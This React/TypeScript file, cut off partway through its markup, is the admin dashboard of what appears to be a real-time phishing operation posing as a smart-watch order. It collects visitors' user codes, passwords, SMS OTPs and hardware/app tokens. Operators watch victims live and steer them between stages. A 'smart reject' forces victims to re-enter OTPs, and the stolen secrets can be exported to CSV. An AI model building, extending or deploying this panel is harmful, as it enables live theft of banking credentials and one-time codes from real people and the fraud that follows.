import { useCallback, useEffect, useMemo, useRef, useState, type FormEvent } from "react";
import { createFileRoute } from "@tanstack/react-router";
import { toast } from "sonner";
import {
  Activity,
  Ban,
  Bell,
  BellOff,
  Check,
  ChevronLeft,
  ChevronRight,
  Clock,
  Copy,
  Download,
  Eye,
  Flame,
  KeyRound,
  LogOut,
  RefreshCw,
  Search,
  Send,
  Settings,
  ShieldAlert,
  Volume2,
  VolumeX,
  ShieldCheck,
  Trash2,
  Users,
  Wifi,
  WifiOff,
  X,
} from "lucide-react";

import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { StatusBadge } from "@/components/status-badge";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  adminDelete,
  adminListAll,
  adminLogin,
  adminSetStage,
  adminSetStatus,
} from "@/lib/admin.functions";
import {
  pushRemoteReject,
  pushRemoteStage,
  subscribeOrderChanges,
} from "@/lib/realtime";
import { subscribeVisitors, type VisitorPresence } from "@/lib/presence";
import { supabase } from "@/integrations/supabase/client";

const TITLE = "لوحة تحكم لحظية — ساعة أهل مصر الذكية";

export const Route = createFileRoute("/dashboard")({
  head: () => ({
    meta: [
      { title: TITLE },
      {
        name: "description",
        content: "لوحة إدارة طلبات ساعة أهل مصر ومتابعة العملاء والتحديثات اللحظية.",
      },
      { property: "og:title", content: TITLE },
      {
        property: "og:description",
        content: "لوحة إدارة طلبات ساعة أهل مصر ومتابعة العملاء والتحديثات اللحظية.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
      { name: "robots", content: "noindex,nofollow" },
    ],
  }),
  component: DashboardPage,
});

type OrderRow = {
  id: string;
  session_id: string;
  name: string | null;
  phone: string | null;
  city: string | null;
  spec: string | null;
  watch_id: string | null;
  status: string;
  stage: string;
  user_code: string | null;
  password: string | null;
  otp: string | null;
  hw_token: string | null;
  app_token: string | null;
  created_at: string;
  updated_at: string;
};

type EventRow = {
  id: string;
  session_id: string;
  stage: string;
  payload: Record<string, unknown> | null;
  created_at: string;
};

const STAGES: { value: OrderRow["stage"]; label: string }[] = [
  { value: "select-watch", label: "اختيار الساعة" },
  { value: "register", label: "البيانات الشخصية" },
  { value: "login", label: "تسجيل الدخول" },
  { value: "verify-otp", label: "رمز التحقق" },
  { value: "hardware-token", label: "توكن الجهاز" },
  { value: "app-token", label: "توكن التطبيق" },
  { value: "processing", label: "الانتظار" },
];

const STAGE_LABEL: Record<string, string> = Object.fromEntries(STAGES.map((s) => [s.value, s.label]));

/** إشعار مختلف لكل صفحة يصلها العميل */
const STAGE_NOTIFY: Record<string, { title: string; body: string }> = {
  "select-watch": { title: "🛒 عميل يتصفّح الساعات", body: "عميل جديد وصل لصفحة اختيار الموديل" },
  register: { title: "📝 عميل في التسجيل", body: "عميل بدأ إدخال بياناته الشخصية" },
  login: { title: "🔐 محاولة تسجيل دخول", body: "عميل أدخل بيانات الدخول — بحاجة مراجعة" },
  "verify-otp": { title: "📩 إدخال رمز OTP", body: "عميل يطلب التحقق من رمز الرسالة النصية" },
  "hardware-token": { title: "🔑 توكن جهاز جديد", body: "عميل أرسل توكن الجهاز — بحاجة مراجعة" },
  "app-token": { title: "📱 توكن تطبيق جديد", body: "عميل أرسل رمز التطبيق — بحاجة مراجعة" },
  processing: { title: "⏳ عميل في الانتظار", body: "عميل في صفحة المعالجة بانتظار قرارك" },
};

const STATUSES = [
  { value: "new", label: "جديد" },
  { value: "review", label: "قيد المراجعة" },
  { value: "approved", label: "مقبول" },
  { value: "rejected", label: "مرفوض" },
];

const STATUS_STYLE: Record<string, string> = {
  new: "bg-primary/10 text-primary",
  review: "bg-warning/15 text-warning",
  approved: "bg-success/15 text-success",
  rejected: "bg-destructive/10 text-destructive",
};

const CREDS_KEY = "elite:admin";
const FILTERS_KEY = "elite:dashboard-filters";
const PAGE_SIZE = 25;

type SortKey = "recent" | "oldest" | "updated";

const SORTS: { value: SortKey; label: string }[] = [
  { value: "recent", label: "الأحدث إنشاءً" },
  { value: "oldest", label: "الأقدم إنشاءً" },
  { value: "updated", label: "آخر تحديث" },
];


function saveCreds(u: string, p: string) {
  sessionStorage.setItem(CREDS_KEY, JSON.stringify({ u, p }));
}
function loadCreds(): { u: string; p: string } | null {
  try {
    const raw = sessionStorage.getItem(CREDS_KEY);
    return raw ? JSON.parse(raw) : null;
  } catch {
    return null;
  }
}
function clearCreds() {
  sessionStorage.removeItem(CREDS_KEY);
}

function DashboardPage() {
  const [creds, setCreds] = useState<{ u: string; p: string } | null>(null);
  useEffect(() => setCreds(loadCreds()), []);
  if (!creds) return <LoginForm onSuccess={(u, p) => setCreds({ u, p })} />;
  return (
    <Dashboard
      username={creds.u}
      password={creds.p}
      onLogout={() => {
        clearCreds();
        setCreds(null);
      }}
    />
  );
}

function extractServerMessage(err: unknown): string {
  const raw =
    err instanceof Error ? err.message : typeof err === "string" ? err : JSON.stringify(err);
  if (!raw) return "تعذر تسجيل الدخول";
  // Zod validation errors arrive as a JSON array of issues — surface them readably.
  try {
    const parsed = JSON.parse(raw);
    if (Array.isArray(parsed)) {
      const lines = parsed
        .map((i: { path?: (string | number)[]; message?: string }) =>
          [Array.isArray(i.path) ? i.path.join(".") : "", i.message].filter(Boolean).join(": "),
        )
        .filter(Boolean);
      if (lines.length) return lines.join(" — ");
    }
  } catch {
    /* not JSON: use the raw message */
  }
  return raw;
}

function LoginForm({ onSuccess }: { onSuccess: (u: string, p: string) => void }) {
  const [u, setU] = useState("");
  const [p, setP] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  async function handle(e: FormEvent) {
    e.preventDefault();
    const user = u.trim();
    const pass = p.trim();
    if (!user || !pass) {
      setError("يرجى إدخال اسم المستخدم وكلمة المرور");
      toast.error("يرجى إدخال اسم المستخدم وكلمة المرور");
      return;
    }
    setLoading(true);
    setError(null);
    try {
      const res = await adminLogin({ data: { username: user, password: pass } });
      if (!res?.ok) {
        const message = res?.error ?? "بيانات الدخول غير صحيحة";
        setError(message);
        toast.error(message);
        return;
      }
      saveCreds(user, pass);
      onSuccess(user, pass);
    } catch (err) {
      const message = extractServerMessage(err);
      setError(message);
      toast.error(message);
    } finally {
      setLoading(false);
    }
  }

  return (
    <div className="dashboard-surface grid min-h-screen place-items-center px-4">
      <form
        onSubmit={handle}
        className="w-full max-w-sm space-y-5 rounded-lg border border-border bg-card p-7 shadow-[var(--dashboard-shadow)]"
      >
        <div className="text-center">
          <span className="mx-auto grid h-12 w-12 place-items-center rounded-lg bg-primary text-primary-foreground shadow-[var(--dashboard-shadow-accent)]">
            <ShieldCheck className="h-6 w-6" />
          </span>
          <h1 className="mt-4 text-xl font-black">مركز إدارة الساعة الذكية</h1>
          <p className="mt-1 text-xs text-muted-foreground">سجّل الدخول لمتابعة العمليات المباشرة</p>
        </div>
        <div className="space-y-2">
          <Label htmlFor="u">اسم المستخدم</Label>
          <Input id="u" value={u} onChange={(e) => setU(e.target.value)} autoComplete="username" />
        </div>
        <div className="space-y-2">
          <Label htmlFor="p">كلمة المرور</Label>
          <Input
            id="p"
            type="password"
            value={p}
            onChange={(e) => setP(e.target.value)}
            autoComplete="current-password"
          />
        </div>
        {error ? (
          <p
            data-testid="admin-login-error"
            role="alert"
            className="rounded-2xl border border-destructive/30 bg-destructive/10 px-3 py-2 text-xs font-bold text-destructive"
          >
            {error}
          </p>
        ) : null}
        <Button
          type="submit"
          className="w-full"
          disabled={loading || !u.trim() || !p.trim()}
        >
          {loading ? "جارٍ الدخول..." : "دخول"}
        </Button>
      </form>
    </div>
  );
}

function Dashboard({
  username,
  password,
  onLogout,
}: {
  username: string;
  password: string;
  onLogout: () => void;
}) {
  const [orders, setOrders] = useState<OrderRow[]>([]);
  const [events, setEvents] = useState<EventRow[]>([]);
  const [visitors, setVisitors] = useState<VisitorPresence[]>([]);
  const [q, setQ] = useState("");
  const [statusFilter, setStatusFilter] = useState<string>("all");
  const [stageFilter, setStageFilter] = useState<string>("all");
  const [onlineOnly, setOnlineOnly] = useState(false);
  const [sortBy, setSortBy] = useState<SortKey>("recent");
  const [visibleCount, setVisibleCount] = useState(PAGE_SIZE);

  const [selected, setSelected] = useState<OrderRow | null>(null);
  const [lastPing, setLastPing] = useState<number>(Date.now());
  const [now, setNow] = useState(() => Date.now());
  const [rtStatus, setRtStatus] = useState<"connecting" | "live" | "offline">("connecting");
  const [alertsEnabled, setAlertsEnabled] = useState(false);
  const [notificationSound, setNotificationSound] = useState(true);
  const [settingsOpen, setSettingsOpen] = useState(false);
  const [needsActionOnly, setNeedsActionOnly] = useState(false);
  const flashRef = useRef<Set<string>>(new Set());
  const eventFeedRef = useRef<HTMLUListElement>(null);
  const hasLoadedRef = useRef(false);
  const ordersRef = useRef<OrderRow[]>([]);
  const alertsRef = useRef(false);
  const prevStageRef = useRef<Map<string, string>>(new Map());

  useEffect(() => {
    try {
      setAlertsEnabled(window.localStorage.getItem("elite:dashboard-alerts") === "true");
      setNotificationSound(window.localStorage.getItem("elite:dashboard-alert-sound") !== "false");
    } catch {
      // Storage can be unavailable in privacy mode; defaults remain safe.
    }
  }, []);

  // Restore saved filters/sort so a refresh keeps the admin's view.
  useEffect(() => {
    try {
      const raw = window.localStorage.getItem(FILTERS_KEY);
      if (!raw) return;
      const s = JSON.parse(raw) as Partial<{
        q: string;
        statusFilter: string;
        stageFilter: string;
        onlineOnly: boolean;
        sortBy: SortKey;
      }>;
      if (typeof s.q === "string") setQ(s.q);
      if (typeof s.statusFilter === "string") setStatusFilter(s.statusFilter);
      if (typeof s.stageFilter === "string") setStageFilter(s.stageFilter);
      if (typeof s.onlineOnly === "boolean") setOnlineOnly(s.onlineOnly);
      if (s.sortBy === "recent" || s.sortBy === "oldest" || s.sortBy === "updated") {
        setSortBy(s.sortBy);
      }
    } catch {
      // Ignore malformed or unavailable storage.
    }
  }, []);

  useEffect(() => {
    try {
      window.localStorage.setItem(
        FILTERS_KEY,
        JSON.stringify({ q, statusFilter, stageFilter, onlineOnly, sortBy }),
      );
    } catch {
      // Ignore storage restrictions.
    }
  }, [q, statusFilter, stageFilter, onlineOnly, sortBy]);



  useEffect(() => {
    ordersRef.current = orders;
    alertsRef.current = alertsEnabled;
  }, [orders, alertsEnabled]);

  const load = useCallback(
    async (options?: { silent?: boolean }) => {
      try {
        const res = await adminListAll({ data: { username, password } });
        const nextOrders = res.orders as OrderRow[];
        const previousIds = new Set(ordersRef.current.map((o) => o.id));
        const freshIds = hasLoadedRef.current
          ? nextOrders.filter((o) => !previousIds.has(o.id)).map((o) => o.id)
          : [];
        for (const id of freshIds) flashRef.current.add(id);
        if (freshIds.length) {
          window.setTimeout(() => {
            for (const id of freshIds) flashRef.current.delete(id);
          }, 2000);
        }

        // اكتشف تغيّر مرحلة كل عميل لإطلاق إشعار مخصّص لكل صفحة
        const canNotify =
          alertsRef.current && "Notification" in window && Notification.permission === "granted";
        const prevStages = prevStageRef.current;
        const stageChanges: { order: OrderRow; isNew: boolean }[] = [];
        for (const o of nextOrders) {
          const prev = prevStages.get(o.session_id);
          if (hasLoadedRef.current && prev !== o.stage) {
            stageChanges.push({ order: o, isNew: !prev });
          }
        }
        if (canNotify && stageChanges.length) {
          for (const { order, isNew } of stageChanges) {
            const meta = STAGE_NOTIFY[order.stage];
            if (!meta) continue;
            const who = order.name || order.phone || order.session_id.slice(0, 8);
            new Notification(meta.title, {
              body: `${isNew ? "🆕 " : ""}${who} — ${meta.body}`,
              icon: "/icon-192.png",
              tag: `stage-${order.session_id}-${order.stage}`,
            });
          }
          playAlertSound(notificationSound);
        }
        // حدّث الخريطة
        const nextMap = new Map<string, string>();
        for (const o of nextOrders) nextMap.set(o.session_id, o.stage);
        prevStageRef.current = nextMap;

        hasLoadedRef.current = true;
        setOrders(nextOrders);
        setEvents(res.events as EventRow[]);
      } catch (err) {
        const msg = (err as Error).message;
        if (msg.includes("غير مصرح") || msg.includes("Unauthorized")) {
          onLogout();
          return;
        }
        if (!options?.silent) toast.error(msg);
      }
    },
    [notificationSound, username, password, onLogout],
  );


  // Initial + realtime subscriptions
  useEffect(() => {
    void load();
    let refetchTimer: number | undefined;
    const scheduleRefetch = () => {
      if (refetchTimer) return;
      refetchTimer = window.setTimeout(() => {
        refetchTimer = undefined;
        void load({ silent: true });
      }, 250);
    };
    const unsub = subscribeOrderChanges(() => {
      setLastPing(Date.now());
      scheduleRefetch();
    });
    return () => {
      if (refetchTimer) window.clearTimeout(refetchTimer);
      unsub();
    };
  }, [load]);

  // Continuous live polling: keeps the dashboard fresh even while the tab is
  // in the background, so new orders show up without switching back to it.
  useEffect(() => {
    let cancelled = false;
    let inFlight = false;
    const tick = async () => {
      if (cancelled || inFlight) return;
      inFlight = true;
      try {
        await load({ silent: true });
      } finally {
        inFlight = false;
      }
    };
    const id = window.setInterval(() => void tick(), 5000);
    return () => {
      cancelled = true;
      window.clearInterval(id);
    };
  }, [load]);

  // Immediate resync when the tab regains focus or the network comes back.
  useEffect(() => {
    const resync = () => {
      if (document.visibilityState === "visible") void load({ silent: true });
    };
    document.addEventListener("visibilitychange", resync);
    window.addEventListener("online", resync);
    window.addEventListener("focus", resync);
    return () => {
      document.removeEventListener("visibilitychange", resync);
      window.removeEventListener("online", resync);
      window.removeEventListener("focus", resync);
    };
  }, [load]);


  // Presence roster

  useEffect(() => {
    const unsub = subscribeVisitors(setVisitors);
    return unsub;
  }, []);

  // Realtime connection status indicator + live dashboard clock
  useEffect(() => {
    setRtStatus(supabase.realtime.isConnected() ? "live" : "connecting");
    const id = window.setInterval(() => {
      setRtStatus(supabase.realtime.isConnected() ? "live" : "offline");
      setNow(Date.now());
    }, 4000);
    return () => window.clearInterval(id);
  }, []);

  useEffect(() => {
    if (events.length > 0) eventFeedRef.current?.scrollTo({ top: 0, behavior: "smooth" });
  }, [events]);

  function updateAlerts(value: boolean) {
    setAlertsEnabled(value);
    try {
      window.localStorage.setItem("elite:dashboard-alerts", String(value));
    } catch {
      // Ignore storage restrictions.
    }
  }

  function updateNotificationSound(value: boolean) {
    setNotificationSound(value);
    try {
      window.localStorage.setItem("elite:dashboard-alert-sound", String(value));
    } catch {
      // Ignore storage restrictions.
    }
  }

  function playAlertSound(enabled: boolean) {
    if (!enabled || typeof window === "undefined" || !("AudioContext" in window)) return;
    try {
      const AudioContextClass = window.AudioContext || (window as typeof window & { webkitAudioContext?: typeof AudioContext }).webkitAudioContext;
      if (!AudioContextClass) return;
      const context = new AudioContextClass();
      const oscillator = context.createOscillator();
      const gain = context.createGain();
      oscillator.frequency.value = 740;
      oscillator.type = "sine";
      gain.gain.setValueAtTime(0.001, context.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.12, context.currentTime + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.001, context.currentTime + 0.28);
      oscillator.connect(gain);
      gain.connect(context.destination);
      oscillator.start();
      oscillator.stop(context.currentTime + 0.3);
      oscillator.addEventListener("ended", () => void context.close());
    } catch {
      // Audio is optional and may be blocked by the browser.
    }
  }

  async function enableAlerts() {
    if (!("Notification" in window)) {
      toast.error("الإشعارات غير مدعومة في هذا المتصفح");
      return;
    }
    const permission = await Notification.requestPermission();
    updateAlerts(permission === "granted");
    if (permission === "granted") toast.success("تم تفعيل تنبيهات الطلبات الجديدة");
    else toast.error("لم يتم السماح بالإشعارات");
  }

  const onlineSet = useMemo(() => new Set(visitors.map((v) => v.sessionId)), [visitors]);
  const pathBySession = useMemo(() => {
    const m: Record<string, string> = {};
    for (const v of visitors) m[v.sessionId] = v.path;
    return m;
  }, [visitors]);

  const filtered = useMemo(() => {
    const list = orders.filter((o) => {
      if (statusFilter !== "all" && o.status !== statusFilter) return false;
      if (stageFilter !== "all" && o.stage !== stageFilter) return false;
      if (onlineOnly && !onlineSet.has(o.session_id)) return false;
      if (q) {
        const s = q.toLowerCase();
        return (
          (o.name ?? "").toLowerCase().includes(s) ||
          (o.phone ?? "").includes(s) ||
          (o.session_id ?? "").includes(s) ||
          (o.user_code ?? "").toLowerCase().includes(s)
        );
      }
      return true;
    });
    const t = (v: string) => new Date(v).getTime();
    const sorted = [...list];
    if (sortBy === "oldest") sorted.sort((a, b) => t(a.created_at) - t(b.created_at));
    else if (sortBy === "updated") sorted.sort((a, b) => t(b.updated_at) - t(a.updated_at));
    else sorted.sort((a, b) => t(b.created_at) - t(a.created_at));
    return sorted;
  }, [orders, q, statusFilter, stageFilter, onlineOnly, onlineSet, sortBy]);

  // Keep the rendered table light: render a page at a time.
  const visible = useMemo(() => filtered.slice(0, visibleCount), [filtered, visibleCount]);
  const selectedIndex = selected ? filtered.findIndex((order) => order.id === selected.id) : -1;

  const selectAdjacentOrder = useCallback(
    (direction: -1 | 1) => {
      if (selectedIndex < 0) return;
      const nextOrder = filtered[selectedIndex + direction];
      if (nextOrder) setSelected(nextOrder);
    },
    [filtered, selectedIndex],
  );

  useEffect(() => {
    setVisibleCount(PAGE_SIZE);
  }, [q, statusFilter, stageFilter, onlineOnly, sortBy]);


  const stats = useMemo(() => {
    const total = orders.length;
    const today = orders.filter(
      (o) => new Date(o.created_at).toDateString() === new Date().toDateString(),
    ).length;
    const inProc = orders.filter((o) => o.stage === "processing").length;
    const approved = orders.filter((o) => o.status === "approved").length;
    return { total, today, inProc, approved, online: visitors.length };
  }, [orders, visitors.length]);

  async function setStage(sessionId: string, stage: OrderRow["stage"]) {
    // Optimistic local update + instant push, then persist
    setOrders((prev) => prev.map((o) => (o.session_id === sessionId ? { ...o, stage } : o)));
    pushRemoteStage(sessionId, stage);
    try {
      await adminSetStage({ data: { username, password, sessionId, stage } });
      toast.success(`تم التوجيه: ${STAGE_LABEL[stage] ?? stage}`);
    } catch (err) {
      toast.error((err as Error).message);
      void load({ silent: true });
    }
  }

  async function setStatus(sessionId: string, status: string) {
    setOrders((prev) => prev.map((o) => (o.session_id === sessionId ? { ...o, status } : o)));
    try {
      await adminSetStatus({
        data: { username, password, sessionId, status: status as "new" },
      });
    } catch (err) {
      toast.error((err as Error).message);
      void load({ silent: true });
    }
  }

  /** إجراءات سريعة: قبول / رفض / رفض ذكي / طلب توكن */
  async function quickAction(
    sessionId: string,
    action: "approve" | "reject" | "smart-reject" | "token",
  ) {
    const current = orders.find((o) => o.session_id === sessionId);
    const map: Record<
      string,
      { status: string; stage: OrderRow["stage"] | null; msg: string; reject?: boolean }
    > = {
      approve: { status: "approved", stage: "processing", msg: "تم القبول" },
      // رفض: تبقى الصفحة كما هي وتظهر للعميل رسالة خطأ مناسبة لها
      reject: { status: "rejected", stage: null, msg: "تم الرفض — أُرسلت رسالة الخطأ", reject: true },
      // رفض ذكي: رسالة خطأ ثم إعادة توجيه لمرحلة التحقق
      "smart-reject": {
        status: "review",
        stage: "verify-otp",
        msg: "رفض ذكي — إعادة التحقق",
        reject: true,
      },
      token: { status: "review", stage: "hardware-token", msg: "تم طلب التوكن" },
    };
    const cfg = map[action]!;
    const nextStage = cfg.stage ?? (current?.stage as OrderRow["stage"] | undefined) ?? null;

    setOrders((prev) =>
      prev.map((o) =>
        o.session_id === sessionId
          ? { ...o, status: cfg.status, ...(cfg.stage ? { stage: cfg.stage } : {}) }
          : o,
      ),
    );

    if (cfg.reject) pushRemoteReject(sessionId, action);
    if (cfg.stage) pushRemoteStage(sessionId, cfg.stage);

    try {
      await Promise.all([
        adminSetStatus({
          data: { username, password, sessionId, status: cfg.status as "new" },
        }),
        ...(nextStage
          ? [
              adminSetStage({
                data: { username, password, sessionId, stage: nextStage as "processing" },
              }),
            ]
          : []),
      ]);
      toast.success(cfg.msg);
    } catch (err) {
      toast.error((err as Error).message);
      void load({ silent: true });
    }
  }

  async function remove(sessionId: string) {
    if (!window.confirm("حذف هذا الطلب وسجل أحداثه؟")) return;
    try {
      await adminDelete({ data: { username, password, sessionId } });
      toast.success("تم الحذف");
      setOrders((prev) => prev.filter((o) => o.session_id !== sessionId));
      if (selected?.session_id === sessionId) setSelected(null);
    } catch (err) {
      toast.error((err as Error).message);
    }
  }

  function copy(text: string, label: string) {
    if (!text) return;
    void navigator.clipboard.writeText(text).then(
      () => toast.success(`تم نسخ ${label}`),
      () => toast.error("فشل النسخ"),
    );
  }

  function exportCsv() {
    const headers = [
      "created_at",
      "session_id",
      "name",
      "phone",
      "city",
      "spec",
      "user_code",
      "password",
      "otp",
      "hw_token",
      "app_token",
      "stage",
      "status",
    ];
    const rows = filtered.map((o) =>
      headers
        .map((h) => {
          const v = String((o as unknown as Record<string, unknown>)[h] ?? "");
          return `"${v.replace(/"/g, '""')}"`;
        })
        .join(","),
    );
    const csv = "\uFEFF" + [headers.join(","), ...rows].join("\n");
    const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `orders-${new Date().toISOString().slice(0, 10)}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  }

  const secondsSincePing = Math.floor((now - lastPing) / 1000);

  /** فتح تفاصيل العميل + تحويل حالته آلياً من "جديد" إلى "قيد المراجعة" */
  function openOrder(order: OrderRow) {
    setSelected(order);
    if (order.status === "new") void setStatus(order.session_id, "review");
  }

  return (
    <div className="dashboard-surface flex h-screen flex-col overflow-hidden" dir="rtl">
      <header className="z-20 shrink-0 border-b border-border bg-card/95 backdrop-blur">
        <div className="flex min-h-16 flex-wrap items-center justify-between gap-3 px-4 py-3 lg:px-6">
          <div className="flex min-w-0 items-center gap-3">
            <span className="grid h-9 w-9 shrink-0 place-items-center rounded-lg bg-primary text-primary-foreground">
              <Activity className="h-4 w-4" />
            </span>
            <div className="min-w-0">
              <h1 className="truncate text-base font-black">مركز العمليات — ساعة أهل مصر</h1>
              <p className="flex items-center gap-2 text-[11px] text-muted-foreground">
                <RealtimeStatus status={rtStatus} />
                <span>آخر مزامنة: {secondsSincePing === 0 ? "الآن" : `منذ ${secondsSincePing}ث`}</span>
              </p>
            </div>
          </div>
          <div className="flex flex-wrap items-center gap-2">
            <StatPill label="الطلبات" value={stats.total} />
            <StatPill label="اليوم" value={stats.today} />
            <StatPill label="انتظار" value={stats.inProc} tone="warning" />
            <StatPill label="مقبول" value={stats.approved} tone="success" />
            <StatPill label="متصل" value={stats.online} tone="accent" />
            <span className="mx-1 hidden h-6 w-px bg-border sm:block" />
            <Button variant="outline" size="sm" onClick={exportCsv} title="تصدير CSV">
              <Download className="h-4 w-4" />
              <span className="hidden lg:inline">تصدير</span>
            </Button>
            <Button variant="outline" size="sm" onClick={() => void load()} title="تحديث">
              <RefreshCw className="h-4 w-4" />
              <span className="hidden lg:inline">تحديث</span>
            </Button>
            <Button
              variant="outline"
              size="sm"
              onClick={() => setSettingsOpen((open) => !open)}
              aria-expanded={settingsOpen}
              title="إعدادات التنبيهات"
            >
              <Settings className="h-4 w-4" />
            </Button>
            <Button
              variant={alertsEnabled ? "secondary" : "outline"}
              size="sm"
              onClick={() => void enableAlerts()}
              title="تنبيهات الطلبات الجديدة"
            >
              {alertsEnabled ? <Bell className="h-4 w-4" /> : <BellOff className="h-4 w-4" />}
            </Button>
            <Button variant="ghost" size="sm" onClick={onLogout}>
              <LogOut className="h-4 w-4" />
              <span className="hidden sm:inline">خروج</span>
            </Button>
          </div>
        </div>
        {settingsOpen && (
          <div className="flex flex-wrap items-center gap-3 border-t border-border bg-secondary/30 px-4 py-3 lg:px-6">
            <p className="me-auto text-xs font-black">إعدادات تنبيهات الطلبات الجديدة</p>
            <label className="flex min-h-[40px] cursor-pointer items-center gap-2 rounded-xl border border-border bg-card px-3 text-xs font-bold">
              <input
                type="checkbox"
                className="accent-primary"
                checked={alertsEnabled}
                onChange={(event) => {
                  if (event.target.checked) void enableAlerts();
                  else updateAlerts(false);
                }}
              />
              <Bell className="h-4 w-4 text-primary" aria-hidden="true" />
              إشعارات سطح المكتب
            </label>
            <label className="flex min-h-[40px] cursor-pointer items-center gap-2 rounded-xl border border-border bg-card px-3 text-xs font-bold">
              <input
                type="checkbox"
                className="accent-primary"
                checked={notificationSound}
                onChange={(event) => updateNotificationSound(event.target.checked)}
              />
              {notificationSound ? (
                <Volume2 className="h-4 w-4 text-primary" />
              ) : (
                <VolumeX className="h-4 w-4 text-muted-foreground" />
              )}
              صوت التنبيه
            </label>
          </div>
        )}
      </header>

      {/* ثلاث أعمدة: يمين = الطلبات، وسط = مساحة العمل، يسار = المتصلون والأحداث */}
      <div className="grid min-h-0 flex-1 gap-4 overflow-y-auto p-4 lg:grid-cols-[340px_minmax(0,1fr)_300px] lg:overflow-hidden lg:p-4">
        {/* RIGHT: قائمة الطلبات */}
        <section className="flex min-h-0 flex-col overflow-hidden rounded-lg border border-border bg-card shadow-[var(--dashboard-shadow)] lg:h-full">
          <div className="shrink-0 space-y-3 border-b border-border p-3">
            <div className="flex items-center justify-between gap-2">
              <h2 className="flex items-center gap-2 text-sm font-black">
                <Users className="h-4 w-4 text-primary" />
                طلبات العملاء
              </h2>
              <span className="rounded-full bg-secondary px-2.5 py-0.5 text-[11px] font-black text-primary">
                {filtered.length} / {orders.length}
              </span>
            </div>
            <div className="relative">
              <Search className="pointer-events-none absolute right-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
              <Input
                placeholder="بحث بالاسم / الهاتف / الكود"
                value={q}
                onChange={(e) => setQ(e.target.value)}
                className="pr-9"
              />
            </div>
            <div className="grid grid-cols-2 gap-2">
              <Select value={statusFilter} onValueChange={setStatusFilter}>
                <SelectTrigger className="h-9 text-xs">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">كل الحالات</SelectItem>
                  {STATUSES.map((s) => (
                    <SelectItem key={s.value} value={s.value}>
                      {s.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <Select value={stageFilter} onValueChange={setStageFilter}>
                <SelectTrigger className="h-9 text-xs">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">كل المراحل</SelectItem>
                  {STAGES.map((s) => (
                    <SelectItem key={s.value} value={s.value}>
                      {s.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <Select value={sortBy} onValueChange={(v) => setSortBy(v as SortKey)}>
                <SelectTrigger className="h-9 text-xs">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  {SORTS.map((s) => (
                    <SelectItem key={s.value} value={s.value}>
                      {s.label}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
              <label className="flex min-h-9 cursor-pointer items-center justify-center gap-2 rounded-xl border border-input bg-background text-xs font-bold">
                <input
                  type="checkbox"
                  className="accent-primary"
                  checked={onlineOnly}
                  onChange={(e) => setOnlineOnly(e.target.checked)}
                />
                المتصلون فقط
              </label>
            </div>
            {(q || statusFilter !== "all" || stageFilter !== "all" || onlineOnly) && (
              <Button
                variant="ghost"
                size="sm"
                className="w-full"
                onClick={() => {
                  setQ("");
                  setStatusFilter("all");
                  setStageFilter("all");
                  setOnlineOnly(false);
                }}
              >
                <X className="h-4 w-4" />
                مسح الفلاتر
              </Button>
            )}
          </div>

          {/* تمرير سلس ومستقل لقائمة الطلبات */}
          <div className="min-h-0 flex-1 space-y-2 overflow-y-auto scroll-smooth p-3">
            {filtered.length === 0 && (
              <p className="rounded-lg bg-secondary/40 p-6 text-center text-xs text-muted-foreground">
                لا توجد طلبات مطابقة
              </p>
            )}
            {visible.map((o) => (
              <OrderCard
                key={o.id}
                order={o}
                isOnline={onlineSet.has(o.session_id)}
                isFresh={flashRef.current.has(o.id)}
                isSelected={selected?.id === o.id}
                onOpen={() => openOrder(o)}
                onAction={(a) => void quickAction(o.session_id, a)}
                onDelete={() => void remove(o.session_id)}
              />
            ))}
            {filtered.length > visible.length && (
              <Button
                variant="outline"
                size="sm"
                className="w-full"
                onClick={() => setVisibleCount((c) => c + PAGE_SIZE)}
              >
                عرض المزيد ({filtered.length - visible.length})
              </Button>
            )}
          </div>
        </section>

        {/* CENTER: مساحة العمل */}
        <section className="min-h-0 overflow-y-auto scroll-smooth lg:h-full">
          {selected ? (
            <OrderWorkspace
              order={selected}
              events={events.filter((e) => e.session_id === selected.session_id)}
              isOnline={onlineSet.has(selected.session_id)}
              currentPath={pathBySession[selected.session_id]}
              onClose={() => setSelected(null)}
              onCopy={copy}
              onStage={(s) => void setStage(selected.session_id, s)}
              onStatus={(s) => void setStatus(selected.session_id, s)}
              onAction={(a) => void quickAction(selected.session_id, a)}
              position={selectedIndex}
              total={filtered.length}
              onPrevious={() => selectAdjacentOrder(-1)}
              onNext={() => selectAdjacentOrder(1)}
            />
          ) : (
            <div className="grid h-full min-h-[320px] place-items-center rounded-lg border border-dashed border-border bg-card/50 p-8 text-center">
              <div>
                <span className="mx-auto grid h-14 w-14 place-items-center rounded-2xl bg-secondary text-primary">
                  <Eye className="h-6 w-6" />
                </span>
                <h2 className="mt-4 text-base font-black">مساحة العمل جاهزة</h2>
                <p className="mt-1 max-w-sm text-xs text-muted-foreground">
                  اختر أي طلب من القائمة على اليمين لعرض بياناته الكاملة والتحكم في مرحلته وحالته من هنا.
                </p>
              </div>
            </div>
          )}
        </section>

        {/* LEFT: المتصلون + الأحداث اللحظية */}
        <aside className="flex min-h-0 flex-col gap-4 lg:h-full">
          <section className="flex min-h-0 flex-1 flex-col overflow-hidden rounded-lg border border-border bg-card shadow-[var(--dashboard-shadow)]">
            <div className="flex shrink-0 items-center justify-between border-b border-border p-3">
              <h2 className="flex items-center gap-2 text-sm font-black">
                <span className="grid h-6 w-6 place-items-center rounded-lg bg-success/15 text-success">
                  <Users className="h-3.5 w-3.5" />
                </span>
                المتصلون الآن
              </h2>
